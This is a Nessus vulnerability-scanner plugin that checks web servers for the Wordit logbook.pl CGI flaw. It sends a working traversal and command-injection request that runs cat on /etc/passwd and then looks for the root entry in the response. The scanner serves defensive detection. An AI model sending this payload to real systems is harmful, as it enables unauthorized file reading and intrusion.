#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11360);
 script_bugtraq_id(7043);
 
 script_version ("$Revision: 1.2 $");
 
 name["english"] = "Wordit Logbook";

 script_name(english:name["english"]);
 
 desc["english"] = "
The CGI logbook.pl is installed. 
This CGI has a well known security flaw that lets anyone
read arbitrary files on this host.

Solution : remove it from /cgi-bin.

Risk factor : Serious";



 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/logbook.pl";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);

foreach d (make_list(cgi_dirs(), ""))
{
 req = http_get(item:string(d, "/logbook.pl?file=../../../../../../../../../../bin/cat%20/etc/passwd%00|"), port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if(res == NULL) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:res)){
 	security_hole(port);
	exit(0);
	}	
}

